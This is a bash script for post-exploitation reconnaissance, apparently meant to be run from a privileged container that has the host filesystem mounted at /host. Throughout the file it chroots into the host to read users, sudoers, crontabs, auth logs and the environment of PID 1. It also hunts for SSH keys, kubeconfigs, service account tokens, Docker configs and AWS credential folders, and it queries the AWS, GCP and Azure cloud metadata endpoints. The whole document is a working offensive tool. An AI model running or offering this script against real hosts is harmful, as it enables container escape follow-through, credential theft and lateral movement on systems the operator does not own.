#!/bin/bash
# Comprehensive Host System Enumeration
# Run from privileged container with /host mount

echo "=========================================="
echo "  HOST SYSTEM ENUMERATION"
echo "=========================================="
echo ""

echo "=== 1. SYSTEM INFORMATION ==="
echo "[*] Operating System:"
chroot /host cat /etc/os-release 2>/dev/null | head -10 || echo "  Cannot read OS info"
echo ""

echo "[*] Kernel Version:"
chroot /host uname -a 2>/dev/null || echo "  Cannot get kernel info"
echo ""

echo "[*] Hostname:"
chroot /host hostname 2>/dev/null || echo "  Cannot get hostname"
echo ""

echo "[*] Uptime:"
chroot /host uptime 2>/dev/null || echo "  Cannot get uptime"
echo ""

echo "=== 2. HARDWARE INFORMATION ==="
echo "[*] CPU Info:"
chroot /host cat /proc/cpuinfo 2>/dev/null | grep -E "(model name|processor)" | head -5 || echo "  Cannot read CPU info"
echo ""

echo "[*] Memory Info:"
chroot /host free -h 2>/dev/null || echo "  Cannot read memory info"
echo ""

echo "[*] Disk Usage:"
chroot /host df -h 2>/dev/null | head -10 || echo "  Cannot read disk info"
echo ""

echo "=== 3. NETWORK CONFIGURATION ==="
echo "[*] Network Interfaces:"
chroot /host ip addr show 2>/dev/null | grep -E "^[0-9]|inet " | head -20 || \
chroot /host ifconfig 2>/dev/null | head -20 || echo "  Cannot read network info"
echo ""

echo "[*] Routing Table:"
chroot /host ip route 2>/dev/null | head -10 || \
chroot /host route -n 2>/dev/null | head -10 || echo "  Cannot read routing table"
echo ""

echo "[*] ARP Table:"
chroot /host ip neigh show 2>/dev/null | head -10 || \
chroot /host arp -a 2>/dev/null | head -10 || echo "  Cannot read ARP table"
echo ""

echo "[*] Listening Ports:"
chroot /host netstat -tulpn 2>/dev/null | head -20 || \
chroot /host ss -tulpn 2>/dev/null | head -20 || echo "  Cannot read listening ports"
echo ""

echo "=== 4. USERS AND GROUPS ==="
echo "[*] Users:"
chroot /host cat /etc/passwd 2>/dev/null | head -20 || echo "  Cannot read passwd"
echo ""

echo "[*] Groups:"
chroot /host cat /etc/group 2>/dev/null | head -20 || echo "  Cannot read groups"
echo ""

echo "[*] Sudoers:"
chroot /host cat /etc/sudoers 2>/dev/null | grep -v "^#" | grep -v "^$" | head -20 || echo "  Cannot read sudoers"
echo ""

echo "[*] Last logged in users:"
chroot /host last 2>/dev/null | head -10 || echo "  Cannot read last logins"
echo ""

echo "=== 5. RUNNING PROCESSES ==="
echo "[*] Top processes:"
chroot /host ps aux 2>/dev/null | head -20 || echo "  Cannot read processes"
echo ""

echo "[*] Systemd services:"
chroot /host systemctl list-units --type=service --state=running 2>/dev/null | head -20 || echo "  Cannot read services"
echo ""

echo "=== 6. INSTALLED SOFTWARE ==="
echo "[*] Installed packages (if apt):"
chroot /host dpkg -l 2>/dev/null | head -20 || echo "  Not Debian-based or cannot read packages"
echo ""

echo "[*] Installed packages (if rpm):"
chroot /host rpm -qa 2>/dev/null | head -20 || echo "  Not RPM-based or cannot read packages"
echo ""

echo "=== 7. DOCKER/KUBERNETES ==="
echo "[*] Docker version:"
chroot /host docker --version 2>/dev/null || echo "  Docker CLI not found"
echo ""

echo "[*] Docker containers on host:"
chroot /host docker ps -a 2>/dev/null | head -10 || echo "  Cannot list containers"
echo ""

echo "[*] Kubernetes components:"
ls -la /host/var/lib/kubelet/ 2>/dev/null | head -10 || echo "  Kubelet not found"
ls -la /host/etc/kubernetes/ 2>/dev/null | head -10 || echo "  Kubernetes config not found"
echo ""

echo "[*] Container runtimes:"
ls -la /host/run/containerd/containerd.sock 2>/dev/null && echo "  containerd found" || echo "  containerd not found"
ls -la /host/var/run/containerd/containerd.sock 2>/dev/null && echo "  containerd found (alt)" || echo "  containerd not found (alt)"
echo ""

echo "=== 8. CREDENTIALS AND SENSITIVE FILES ==="
echo "[*] SSH keys:"
find /host/root/.ssh -type f 2>/dev/null | head -10 || echo "  No root SSH keys found"
find /host/home -name ".ssh" -type d 2>/dev/null | head -10 || echo "  No user SSH keys found"
echo ""

echo "[*] Docker configs:"
find /host -name ".docker" -type d 2>/dev/null | head -10 || echo "  No Docker configs found"
find /host -name "config.json" -path "*/.docker/*" 2>/dev/null | head -10 || echo "  No Docker config files found"
echo ""

echo "[*] Kubernetes configs:"
find /host -path "*/.kube/config" 2>/dev/null | head -10 || echo "  No kubeconfig found"
find /host -name "kubeconfig" 2>/dev/null | head -10 || echo "  No kubeconfig found"
echo ""

echo "[*] Service account tokens:"
find /host -path "*/serviceaccount/token" 2>/dev/null | head -10 || echo "  No service account tokens found"
echo ""

echo "[*] AWS credentials:"
find /host -name ".aws" -type d 2>/dev/null | head -10 || echo "  No AWS credentials found"
echo ""

echo "=== 9. SCHEDULED TASKS ==="
echo "[*] Crontab (root):"
chroot /host crontab -l -u root 2>/dev/null || echo "  No root crontab or cannot read"
echo ""

echo "[*] System crontab:"
chroot /host cat /etc/crontab 2>/dev/null | grep -v "^#" | grep -v "^$" || echo "  No system crontab or cannot read"
echo ""

echo "[*] Cron directories:"
chroot /host ls -la /etc/cron.d/ 2>/dev/null | head -10 || echo "  Cannot read cron.d"
chroot /host ls -la /etc/cron.daily/ 2>/dev/null | head -10 || echo "  Cannot read cron.daily"
echo ""

echo "=== 10. FILE SYSTEM MOUNTS ==="
echo "[*] Mount points:"
chroot /host mount 2>/dev/null | head -20 || cat /host/proc/mounts | head -20 || echo "  Cannot read mounts"
echo ""

echo "[*] Fstab:"
chroot /host cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -v "^$" || echo "  Cannot read fstab"
echo ""

echo "=== 11. ENVIRONMENT VARIABLES ==="
echo "[*] System environment (from /proc):"
chroot /host cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -20 || echo "  Cannot read process environment"
echo ""

echo "=== 12. CLOUD PROVIDER METADATA ==="
echo "[*] AWS metadata:"
curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null | head -5 || echo "  Not AWS or metadata not accessible"
echo ""

echo "[*] GCP metadata:"
curl -s --max-time 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null | head -5 || echo "  Not GCP or metadata not accessible"
echo ""

echo "[*] Azure metadata:"
curl -s --max-time 2 -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01 2>/dev/null | head -5 || echo "  Not Azure or metadata not accessible"
echo ""

echo "=== 13. LOG FILES ==="
echo "[*] Recent auth logs:"
chroot /host tail -20 /var/log/auth.log 2>/dev/null || \
chroot /host tail -20 /var/log/secure 2>/dev/null || echo "  Cannot read auth logs"
echo ""

echo "[*] Recent syslog:"
chroot /host tail -10 /var/log/syslog 2>/dev/null || \
chroot /host tail -10 /var/log/messages 2>/dev/null || echo "  Cannot read syslog"
echo ""

echo "=========================================="
echo "  ENUMERATION COMPLETE"
echo "=========================================="
